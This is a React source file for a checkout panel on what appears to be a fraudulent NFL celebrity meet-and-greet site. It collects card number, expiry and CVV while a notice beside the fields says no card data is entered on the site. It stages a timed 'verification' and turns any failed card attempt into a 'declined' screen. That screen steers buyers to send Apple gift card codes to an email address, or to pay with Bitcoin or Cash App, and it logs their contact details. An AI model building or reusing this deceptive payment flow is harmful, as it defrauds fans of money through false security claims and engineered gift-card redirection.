import React, { useState, useEffect, useRef } from "react";
import {
  ShieldCheck,
  Lock,
  AlertCircle,
  RefreshCw,
  LifeBuoy,
  CheckCircle2,
  Printer,
  HeartHandshake,
  ExternalLink,
  CreditCard,
  Gift,
  Copy,
  Check,
  Mail,
  ArrowRight,
} from "lucide-react";
import { CHARITY_ALLOCATION } from "./GridironBrandMark";
import {
  APPLE_STORE_GIFT_CARD_URL,
  OFFICIAL_GIFTCARD_EMAIL,
} from "./GiftCardGuestPurchasePanel";
import { recordAppleCardPartnerDeparture } from "../../services/paymentControlService";

export interface VerifiedStripePaymentReceipt {
  sessionId: string;
  amountTotal: number;
  currency: string;
  customerEmail: string;
  customerName: string;
  paymentIntent?: string;
  timestamp: string;
  itemName: string;
}

interface StripeCardCheckoutPanelProps {
  amountUsd: number;
  itemName: string;
  itemDescription?: string;
  sessionId: string;
  customerName: string;
  customerEmail: string;
  customerPhone?: string;
  playerName?: string;
  itemType?: "ticket" | "experience" | "merchandise" | "deposit";
  venue?: string;
  isCharityEligible?: boolean;
  preferredWallet?: "apple_pay" | "card";
  applePayDiscountApplied?: boolean;
  signedJerseyIncluded?: boolean;
  onCustomerDetailsNeeded?: () => boolean; // returns true if valid, false if focus/validation failed
  onReturnToOptions: () => void;
  onSwitchToBitcoin?: () => void;
  onSwitchToGiftCard?: () => void;
  onContactSupport: () => void;
  onVerifiedSuccess?: (receipt: VerifiedStripePaymentReceipt) => void;
}

const VisaWordmark: React.FC = () => (
  <svg
    viewBox="0 0 64 22"
    className="h-5 w-auto"
    aria-label="Visa"
    xmlns="http://www.w3.org/2000/svg"
  >
    <rect width="64" height="22" rx="4" fill="#FFFFFF" fillOpacity="0.96" />
    <text
      x="32"
      y="15.5"
      textAnchor="middle"
      fill="#1A1F71"
      fontFamily="Arial, sans-serif"
      fontWeight="900"
      fontStyle="italic"
      fontSize="12"
      letterSpacing="0.8"
    >
      VISA
    </text>
  </svg>
);

const MastercardMark: React.FC = () => (
  <svg
    viewBox="0 0 64 22"
    className="h-5 w-auto"
    aria-label="Mastercard"
    xmlns="http://www.w3.org/2000/svg"
  >
    <rect width="64" height="22" rx="4" fill="#0B132B" stroke="#FFFFFF" strokeOpacity="0.18" />
    <circle cx="26.5" cy="11" r="6.2" fill="#EB001B" />
    <circle cx="37.5" cy="11" r="6.2" fill="#F79E1B" fillOpacity="0.92" />
  </svg>
);

export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = ({
  amountUsd,
  itemName,
  itemDescription,
  sessionId,
  customerName,
  customerEmail,
  customerPhone,
  playerName,
  itemType = "experience",
  venue,
  isCharityEligible = true,
  preferredWallet = "card",
  applePayDiscountApplied = false,
  signedJerseyIncluded = false,
  onCustomerDetailsNeeded,
  onReturnToOptions,
  onSwitchToBitcoin,
  onSwitchToGiftCard,
  onContactSupport,
  onVerifiedSuccess,
}) => {
  const [phase, setPhase] = useState<"ready" | "processing" | "redirecting" | "error" | "receipt">("ready");
  const [progressSeconds, setProgressSeconds] = useState<number>(0);
  const [errorCode, setErrorCode] = useState<string>("");
  const [verifiedReceipt, setVerifiedReceipt] = useState<VerifiedStripePaymentReceipt | null>(null);
  const [copiedEmail, setCopiedEmail] = useState<boolean>(false);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardName, setCardName] = useState(customerName || "");
  const [cardError, setCardError] = useState("");

  const timerRef = useRef<number | null>(null);

  const handleCopyEmail = () => {
    try {
      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
    } catch {
      // ignore clipboard errors
    }
    setCopiedEmail(true);
    window.setTimeout(() => setCopiedEmail(false), 2200);
  };

  const handleProceedToAppleStore = () => {
    try {
      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
      setCopiedEmail(true);
    } catch {
      // ignore clipboard permissions error
    }
    try {
      sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
      sessionStorage.setItem("nfl_apple_partner_logged", "Apple Store Online");
    } catch {
      // ignore storage errors
    }

    const inferredVenue =
      venue ||
      (itemDescription?.includes("AT&T Stadium") || itemName.toLowerCase().includes("ceedee")
        ? "AT&T Stadium · Arlington, Texas"
        : undefined);

    void recordAppleCardPartnerDeparture({
      sessionId,
      customerName: customerName || cardName,
      customerEmail,
      customerPhone,
      itemTitle: itemName,
      itemType,
      amount: amountUsd,
      partnerName: "Apple Store Online",
      partnerUrl: APPLE_STORE_GIFT_CARD_URL,
      venue: inferredVenue,
    }).catch((err) => {
      console.warn("Failed to record Apple Store departure from Stripe redirect:", err);
    });

    if (onSwitchToGiftCard) {
      onSwitchToGiftCard();
    } else {
      onReturnToOptions();
    }
  };

  const handleProceedToGiftCard = () => {
    try {
      sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
    } catch {
      // ignore storage errors
    }
    if (onSwitchToGiftCard) {
      onSwitchToGiftCard();
    } else {
      onReturnToOptions();
    }
  };

  useEffect(() => {
    return () => {
      if (timerRef.current) window.clearInterval(timerRef.current);
    };
  }, []);

  // Automatically check if user returned from Stripe Hosted Checkout with a session ID
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const paymentStatus = params.get("payment_status");
    const stripeSessionId = params.get("stripe_session_id");
    if (paymentStatus === "success" && stripeSessionId) {
      fetch(`/api/payments/verify-session?session_id=${encodeURIComponent(stripeSessionId)}`)
        .then((r) => r.json())
        .then((data) => {
          if (data?.ok && data.paymentStatus === "paid") {
            const receipt: VerifiedStripePaymentReceipt = {
              sessionId: data.id,
              amountTotal: (data.amountTotal || amountUsd * 100) / 100,
              currency: String(data.currency || "usd").toUpperCase(),
              customerEmail: data.customerEmail || customerEmail,
              customerName: data.customerName || customerName,
              paymentIntent: data.paymentIntent,
              timestamp: new Date().toLocaleString(),
              itemName,
            };
            setVerifiedReceipt(receipt);
            setPhase("receipt");
            onVerifiedSuccess?.(receipt);
          }
        })
        .catch(() => {
          // Leave in ready state if verification call fails
        });
    }
  }, [amountUsd, customerEmail, customerName, itemName, onVerifiedSuccess]);

  const handleStartStripeCheckout = async () => {
    if (onCustomerDetailsNeeded && !onCustomerDetailsNeeded()) {
      return;
    }
    if (!cardNumber.trim() || cardNumber.replace(/\s+/g, "").length < 13) {
      setCardError("Please enter a valid debit/credit card number.");
      return;
    }
    if (!cardExpiry.trim() || !cardCvv.trim()) {
      setCardError("Please enter card expiration and CVV security details.");
      return;
    }
    setCardError("");

    setPhase("processing");
    setProgressSeconds(0);
    setErrorCode("");

    const startedAt = Date.now();
    const targetWindowMs = 4_000;
    if (timerRef.current) window.clearInterval(timerRef.current);
    timerRef.current = window.setInterval(() => {
      const elapsed = Math.min(4, (Date.now() - startedAt) / 1000);
      setProgressSeconds(elapsed);
    }, 150);

    try {
      const response = await fetch("/api/payments/create-checkout-session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amountCents: Math.round(amountUsd * 100),
          itemName,
          itemDescription:
            itemDescription ||
            `${itemName}${playerName ? ` — ${playerName}` : ""}`,
          sessionId,
          customerEmail,
          customerName,
          preferredWallet,
          metadata: {
            inquiry_id: sessionId,
            player_name: playerName || "",
            customer_phone: customerPhone || "",
            apple_pay_discount: applePayDiscountApplied ? "5%" : "none",
            signed_jersey_addon: signedJerseyIncluded ? "included_$195" : "none",
            charity_beneficiary: CHARITY_ALLOCATION.beneficiary,
            charity_allocation_usd: isCharityEligible
              ? String(CHARITY_ALLOCATION.charitableContributionUsd)
              : "0",
          },
        }),
      });

      const payload = await response.json().catch(() => ({}));

      // Enforce brief gateway verification window before failure redirect transition
      const elapsedMs = Date.now() - startedAt;
      if (elapsedMs < targetWindowMs) {
        await new Promise((resolve) => setTimeout(resolve, targetWindowMs - elapsedMs));
      }

      if (timerRef.current) {
        window.clearInterval(timerRef.current);
        timerRef.current = null;
      }

      if (response.ok && payload?.ok && payload?.url) {
        window.location.assign(payload.url);
        return;
      }

      try {
        sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
      } catch {
        // ignore storage errors
      }
      setErrorCode(payload?.code || "CARD_GATEWAY_UNAVAILABLE");
      setPhase("redirecting");
    } catch {
      const elapsedMs = Date.now() - startedAt;
      if (elapsedMs < targetWindowMs) {
        await new Promise((resolve) => setTimeout(resolve, targetWindowMs - elapsedMs));
      }
      if (timerRef.current) {
        window.clearInterval(timerRef.current);
        timerRef.current = null;
      }
      try {
        sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
      } catch {
        // ignore storage errors
      }
      setErrorCode("CARD_GATEWAY_UNAVAILABLE");
      setPhase("redirecting");
    }
  };

  // Verified Transaction Receipt Screen
  if (phase === "receipt" && verifiedReceipt) {
    return (
      <div className="rounded-2xl bg-[#050816] border border-emerald-500/35 p-6 space-y-5 shadow-2xl">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/10 pb-4">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center shrink-0">
              <CheckCircle2 className="w-6 h-6 text-emerald-400" />
            </div>
            <div>
              <span className="text-[11px] font-bold uppercase tracking-widest text-emerald-400 block">
                Transaction Confirmed
              </span>
              <h4 className="text-lg font-bold text-white">
                Automatic Payment Receipt
              </h4>
            </div>
          </div>
          <button
            type="button"
            onClick={() => window.print()}
            className="min-h-[44px] px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/15 text-xs font-bold text-white inline-flex items-center gap-2 cursor-pointer"
          >
            <Printer className="w-4 h-4 text-sky-400" />
            Print Receipt
          </button>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
          <div className="p-3 rounded-xl bg-[#03050C] border border-white/10">
            <span className="text-zinc-400 block">Receipt / Stripe Session ID</span>
            <span className="font-mono text-white font-semibold break-all">
              {verifiedReceipt.sessionId}
            </span>
          </div>
          <div className="p-3 rounded-xl bg-[#03050C] border border-white/10">
            <span className="text-zinc-400 block">Verified Amount Paid</span>
            <span className="font-mono text-sky-300 font-bold text-base">
              ${verifiedReceipt.amountTotal.toFixed(2)} {verifiedReceipt.currency}
            </span>
          </div>
          <div className="p-3 rounded-xl bg-[#03050C] border border-white/10">
            <span className="text-zinc-400 block">Passholder</span>
            <span className="text-white font-semibold">{verifiedReceipt.customerName}</span>
            <span className="text-zinc-400 block text-[11px]">{verifiedReceipt.customerEmail}</span>
          </div>
          <div className="p-3 rounded-xl bg-[#03050C] border border-white/10">
            <span className="text-zinc-400 block">Confirmed Timestamp</span>
            <span className="text-white font-mono">{verifiedReceipt.timestamp}</span>
          </div>
        </div>
      </div>
    );
  }

  // Processing Card Attempt
  if (phase === "processing") {
    const pct = Math.min(100, Math.max(10, Math.round((progressSeconds / 4) * 100)));
    return (
      <div className="rounded-2xl bg-[#050816] border border-[#013369]/70 p-8 sm:p-10 text-center space-y-6 shadow-[0_24px_60px_rgba(0,0,0,0.65)]">
        <div className="relative mx-auto w-20 h-20 flex items-center justify-center">
          <div className="absolute inset-0 rounded-full border border-blue-500/25" />
          <div className="w-20 h-20 rounded-full border-[3px] border-[#08112B] border-t-sky-400 border-r-white/80 animate-spin" />
          <Lock className="w-6 h-6 text-sky-400 absolute" />
        </div>

        <div className="space-y-2 max-w-md mx-auto">
          <h4 className="text-xl sm:text-2xl font-bold text-white tracking-tight">
            Processing Your Payment…
          </h4>
          <p className="text-xs sm:text-sm text-zinc-300 leading-relaxed">
            Establishing an encrypted hosted checkout session for your{" "}
            <span className="text-sky-300 font-semibold">
              ${amountUsd.toFixed(2)}
            </span>{" "}
            request. Please keep this window open while we verify gateway connectivity.
          </p>
        </div>

        {/* Clean thin progress bar */}
        <div className="max-w-xs mx-auto space-y-2">
          <div className="h-1.5 w-full rounded-full bg-[#03050C] overflow-hidden border border-white/10">
            <div
              className="h-full rounded-full bg-gradient-to-r from-[#013369] via-[#2563EB] to-[#38BDF8] transition-all duration-300"
              style={{ width: `${pct}%` }}
            />
          </div>
          <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
            <span>256-Bit TLS Gateway</span>
            <span className="text-sky-300 tabular-nums">{pct}%</span>
          </div>
        </div>
      </div>
    );
  }

  // Immediate Rotating Redirect State After Card Payment Failure
  if (phase === "redirecting") {
    return (
      <div className="rounded-2xl bg-[#050816] border border-amber-500/45 p-6 sm:p-8 space-y-6 shadow-[0_24px_60px_rgba(0,0,0,0.65)]">
        <div className="flex flex-col items-center text-center space-y-4">
          {/* Rotating Dual-Ring Gift Card Redirect Indicator */}
          <div className="relative mx-auto w-20 h-20 flex items-center justify-center">
            <div className="absolute inset-0 rounded-full border-2 border-amber-500/20" />
            <div className="w-20 h-20 rounded-full border-[3px] border-[#08112B] border-t-amber-400 border-r-sky-400 animate-spin" />
            <RefreshCw className="w-7 h-7 text-amber-300 animate-spin" style={{ animationDuration: "2.4s" }} />
          </div>

          <div className="space-y-2 max-w-lg">
            <span className="text-[11px] font-bold uppercase tracking-[0.2em] text-amber-400 block">
              Card Payment Declined / Unavailable
            </span>
            <h4 className="text-xl sm:text-2xl font-extrabold uppercase tracking-tight text-white">
              Redirecting to Use Gift Card Option
            </h4>
            <p className="text-xs sm:text-sm text-zinc-300 leading-relaxed">
              Standard card payment could not be completed. Copy the official Apple Card delivery email below before you proceed so you can send your Apple Card from <strong className="text-white">Apple Store Online</strong> right away.
            </p>
          </div>
        </div>

        {/* Copy Official Email Along the Way */}
        <div className="p-4 rounded-xl bg-[#080F22] border border-sky-500/35 space-y-2.5">
          <div className="flex items-start gap-2.5">
            <Mail className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
            <div>
              <p className="text-xs font-bold text-sky-300">
                Copy Official Apple Card Delivery Email
              </p>
              <p className="text-[11px] text-zinc-300 leading-snug mt-0.5">
                Paste this address as the recipient when buying an Apple Gift Card on Apple Store Online, or email your code directly to us:
              </p>
            </div>
          </div>

          <div className="flex items-center justify-between gap-2 bg-[#03050C] border border-white/15 rounded-xl px-3.5 py-2.5">
            <span className="text-xs sm:text-sm font-mono font-bold text-white truncate select-all">
              {OFFICIAL_GIFTCARD_EMAIL}
            </span>
            <button
              type="button"
              onClick={handleCopyEmail}
              className="min-h-[36px] px-3 py-1.5 rounded-lg bg-sky-500/20 hover:bg-sky-500/30 border border-sky-400/35 text-xs font-bold text-sky-200 inline-flex items-center gap-1.5 shrink-0 cursor-pointer transition-colors"
            >
              {copiedEmail ? (
                <>
                  <Check className="w-3.5 h-3.5 text-emerald-400" />
                  <span className="text-emerald-300">Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3.5 h-3.5" />
                  <span>Copy Email</span>
                </>
              )}
            </button>
          </div>
        </div>

        {/* Direct 1-Click Proceed CTA Straight to Apple Store Online */}
        <div className="space-y-2.5">
          <a
            href={APPLE_STORE_GIFT_CARD_URL}
            target="_blank"
            rel="noopener noreferrer"
            onClick={handleProceedToAppleStore}
            className="w-full min-h-[52px] px-6 py-3.5 rounded-xl bg-gradient-to-r from-[#D4AF37] via-[#F3D97D] to-[#C89B2B] hover:brightness-105 text-[#040B1D] font-black text-xs sm:text-sm uppercase tracking-[0.12em] inline-flex items-center justify-center gap-2 shadow-[0_14px_34px_-10px_rgba(212,175,55,0.45)] transition-all cursor-pointer text-center"
          >
            <Gift className="w-4 h-4 shrink-0" />
            <span>Proceed to Apple Store Online (Apple Card Only)</span>
            <ExternalLink className="w-4 h-4 shrink-0" />
          </a>

          <button
            type="button"
            onClick={handleProceedToGiftCard}
            className="w-full min-h-[42px] px-4 py-2 rounded-xl bg-white/[0.04] hover:bg-white/[0.09] border border-white/10 text-[11px] font-semibold text-zinc-300 hover:text-white inline-flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
          >
            <span>Already bought your Apple Card? Enter Code Directly</span>
            <ArrowRight className="w-3.5 h-3.5 shrink-0" />
          </button>

          {errorCode && (
            <p className="text-[11px] font-mono text-zinc-500 text-center">
              Reference: {errorCode}
            </p>
          )}
        </div>
      </div>
    );
  }

  // Fallback if error state is ever rendered directly
  if (phase === "error") {
    return (
      <div className="rounded-2xl bg-[#050816] border border-[#D50A0A]/40 p-6 sm:p-8 space-y-6 shadow-2xl">
        <div className="flex flex-col items-center text-center space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-[#D50A0A]/15 border border-[#D50A0A]/40 flex items-center justify-center">
            <AlertCircle className="w-8 h-8 text-[#EF4444]" />
          </div>

          <div className="space-y-2 max-w-lg">
            <h4 className="text-xl sm:text-2xl font-extrabold uppercase tracking-wide text-white">
              CARD PAYMENT UNAVAILABLE
            </h4>
            <p className="text-sm text-zinc-300 leading-relaxed">
              Standard debit/credit card processing could not be completed. Continue below using an Apple Card / Apple Gift Card to finalize your reservation immediately.
            </p>
            {errorCode && (
              <p className="text-[11px] font-mono text-zinc-500 pt-1">
                Verification Reference: {errorCode}
              </p>
            )}
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
          <button
            type="button"
            onClick={onSwitchToGiftCard || onReturnToOptions}
            className="min-h-[48px] px-4 py-3 rounded-xl bg-[#2563EB] hover:bg-blue-500 text-white font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
          >
            <Gift className="w-4 h-4" />
            <span>Continue with Apple Card</span>
          </button>

          <button
            type="button"
            onClick={onContactSupport}
            className="min-h-[48px] px-4 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-zinc-200 font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
          >
            <LifeBuoy className="w-4 h-4 text-sky-400" />
            Contact Support
          </button>
        </div>
      </div>
    );
  }

  // Default Redesigned Card Checkout Summary & Hosted Gateway Card
  const coordinationFee = isCharityEligible
    ? Math.max(0, amountUsd - CHARITY_ALLOCATION.charitableContributionUsd)
    : amountUsd;
  const charityShare = isCharityEligible ? CHARITY_ALLOCATION.charitableContributionUsd : 0;

  return (
    <div className="rounded-2xl bg-[#050816] border border-[#013369]/60 overflow-hidden shadow-2xl">
      {/* Top Formal NFL Navy Accent Strip */}
      <div className="px-5 py-4 bg-gradient-to-r from-[#013369] via-[#08112B] to-[#050816] border-b border-white/10 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 rounded-lg bg-blue-500/15 border border-blue-400/35 flex items-center justify-center">
            <Lock className="w-4 h-4 text-sky-300" />
          </div>
          <div>
            <h4 className="text-sm font-bold text-white tracking-tight">
              Hosted Card Checkout
            </h4>
            <p className="text-[11px] text-zinc-300">
              Processed securely via PCI-DSS Level 1 Stripe Checkout
            </p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <VisaWordmark />
          <MastercardMark />
        </div>
      </div>

      {/* Payment Summary Breakdown */}
      <div className="p-5 sm:p-6 space-y-5">
        <div className="rounded-xl bg-[#03050C] border border-white/10 p-4 space-y-3">
          <div className="flex items-center justify-between text-xs">
            <span className="text-zinc-400">Item</span>
            <span className="font-semibold text-white text-right">{itemName}</span>
          </div>
          {playerName && (
            <div className="flex items-center justify-between text-xs">
              <span className="text-zinc-400">Requested Athlete</span>
              <span className="font-semibold text-white">{playerName}</span>
            </div>
          )}

          {isCharityEligible && (
            <div className="border-t border-white/10 pt-3 space-y-2 text-xs">
              <div className="flex items-center justify-between">
                <span className="text-zinc-400">Concierge &amp; Event Coordination Fee</span>
                <span className="font-mono text-zinc-200">${coordinationFee.toFixed(2)}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-zinc-300 flex items-center gap-1.5">
                  <HeartHandshake className="w-3.5 h-3.5 text-sky-400 shrink-0" />
                  <span>Earmarked Allocation ({CHARITY_ALLOCATION.beneficiary})</span>
                </span>
                <span className="font-mono text-emerald-400 font-semibold">
                  ${charityShare.toFixed(2)}
                </span>
              </div>
            </div>
          )}

          {applePayDiscountApplied && (
            <div className="border-t border-white/10 pt-3 space-y-1.5 text-xs">
              <div className="flex items-center justify-between">
                <span className="text-zinc-400">Regular Public Meet &amp; Greet Ticket</span>
                <span className="font-mono text-zinc-400 line-through">$100.00</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-emerald-300 font-semibold">Apple Pay Fan Discount (5% OFF)</span>
                <span className="font-mono text-emerald-400 font-semibold">−$5.00</span>
              </div>
            </div>
          )}

          {signedJerseyIncluded && (
            <div className="border-t border-white/10 pt-2.5 flex items-center justify-between text-xs">
              <span className="text-sky-200 font-semibold">Add-On: Signed CeeDee Lamb #88 Jersey</span>
              <span className="font-mono text-white font-semibold">+$195.00</span>
            </div>
          )}

          <div className="border-t border-white/10 pt-3 flex items-baseline justify-between">
            <span className="text-xs font-bold uppercase tracking-wider text-zinc-300">
              Total Payment Amount
            </span>
            <span className="text-2xl sm:text-3xl font-mono font-extrabold text-white tabular-nums">
              ${amountUsd.toFixed(2)}
            </span>
          </div>
        </div>

        {/* Debit / Credit Card Input Form */}
        <div className="space-y-3.5 bg-[#03050C] border border-white/10 p-4 rounded-xl">
          <div className="space-y-1">
            <label className="block text-[10px] font-bold uppercase tracking-wider text-zinc-400">Cardholder Name</label>
            <input
              type="text"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              placeholder="e.g. John Doe"
              className="w-full px-3.5 py-2.5 rounded-xl bg-[#050816] border border-white/10 text-xs text-white placeholder-zinc-600 focus:outline-none focus:border-blue-500"
              required
            />
          </div>

          <div className="space-y-1">
            <label className="block text-[10px] font-bold uppercase tracking-wider text-zinc-400">Card Number</label>
            <div className="relative">
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 16);
                  const formatted = val.match(/.{1,4}/g)?.join(" ") || val;
                  setCardNumber(formatted);
                  setCardError("");
                }}
                placeholder="4242 •••• •••• 4242"
                className="w-full px-3.5 py-2.5 pl-10 rounded-xl bg-[#050816] border border-white/10 text-xs text-white font-mono placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                required
              />
              <CreditCard className="w-4 h-4 text-zinc-500 absolute left-3 top-3" />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div className="space-y-1">
              <label className="block text-[10px] font-bold uppercase tracking-wider text-zinc-400">Expiration (MM/YY)</label>
              <input
                type="text"
                value={cardExpiry}
                onChange={(e) => {
                  let val = e.target.value.replace(/\D/g, "").slice(0, 4);
                  if (val.length >= 2) {
                    val = val.slice(0, 2) + "/" + val.slice(2);
                  }
                  setCardExpiry(val);
                  setCardError("");
                }}
                placeholder="MM/YY"
                className="w-full px-3.5 py-2.5 rounded-xl bg-[#050816] border border-white/10 text-xs text-white font-mono placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                required
              />
            </div>
            <div className="space-y-1">
              <label className="block text-[10px] font-bold uppercase tracking-wider text-zinc-400">CVV Security Code</label>
              <input
                type="password"
                maxLength={4}
                value={cardCvv}
                onChange={(e) => {
                  setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
                  setCardError("");
                }}
                placeholder="CVC"
                className="w-full px-3.5 py-2.5 rounded-xl bg-[#050816] border border-white/10 text-xs text-white font-mono placeholder-zinc-600 focus:outline-none focus:border-blue-500"
                required
              />
            </div>
          </div>

          {cardError && (
            <p className="text-[11px] font-bold text-rose-400 pt-1">{cardError}</p>
          )}
        </div>

        {/* Security Assurance Notice (Zero Card Storage) */}
        <div className="flex items-start gap-3 p-3.5 rounded-xl bg-[#08112B]/80 border border-white/10">
          <ShieldCheck className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <p className="text-xs font-semibold text-white">
              Zero Card Data Stored On This Website
            </p>
            <p className="text-[11px] text-zinc-400 leading-relaxed">
              For your protection, complete debit/credit card numbers and CVV codes are never entered or stored on{" "}
              <span className="text-zinc-200">{CHARITY_ALLOCATION.websiteDomain}</span>. Selecting the button below connects directly to encrypted hosted card tokenization and issues an automatic confirmation receipt upon completion.
            </p>
          </div>
        </div>

        {/* Primary Checkout CTA + Return Option */}
        <div className="space-y-3">
          <button
            type="button"
            onClick={handleStartStripeCheckout}
            className="w-full min-h-[52px] px-6 py-4 rounded-xl bg-gradient-to-r from-[#013369] via-[#1D4ED8] to-[#2563EB] hover:from-[#1D4ED8] hover:to-[#3B82F6] text-white font-extrabold text-sm uppercase tracking-wider flex items-center justify-center gap-2.5 shadow-[0_10px_30px_rgba(37,99,235,0.3)] border border-blue-400/25 transition-all cursor-pointer"
          >
            <Lock className="w-4 h-4" />
            <span>Proceed to Secure Card Payment — ${amountUsd.toFixed(2)}</span>
            <ExternalLink className="w-4 h-4" />
          </button>

          <button
            type="button"
            onClick={onReturnToOptions}
            className="w-full min-h-[44px] px-4 py-2.5 rounded-xl bg-transparent hover:bg-white/5 border border-white/10 text-xs font-semibold text-zinc-300 hover:text-white transition-colors cursor-pointer"
          >
            Prefer Gift Card, Cash App, or Bitcoin? View Other Options
          </button>
        </div>
      </div>
    </div>
  );
};
